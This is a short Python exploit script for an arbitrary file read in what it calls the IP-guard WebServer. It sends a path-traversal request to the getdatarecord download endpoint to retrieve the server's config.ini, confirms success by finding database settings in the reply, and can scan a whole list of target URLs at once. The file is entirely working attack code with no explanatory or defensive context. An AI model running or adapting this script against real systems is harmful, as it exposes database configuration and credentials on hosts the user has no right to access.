import requests,re
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,"/ipg/appr/MApplyList/downloadFile_client/getdatarecord")
    data = 'path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A'
    headers = {
        'Content-Type':'application/x-www-form-urlencoded',
        "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36"
    }
    try:
        response = requests.post(target, data = data ,headers=headers , verify=False)
        if response.status_code == 200 and 'dbdriver' in response.text and 'database' in response.text:
            print(f"\033[31mDiscovered:{url}: IP-guardWebServer_getdatarecord_ArbitraryFileRead!\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt

    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")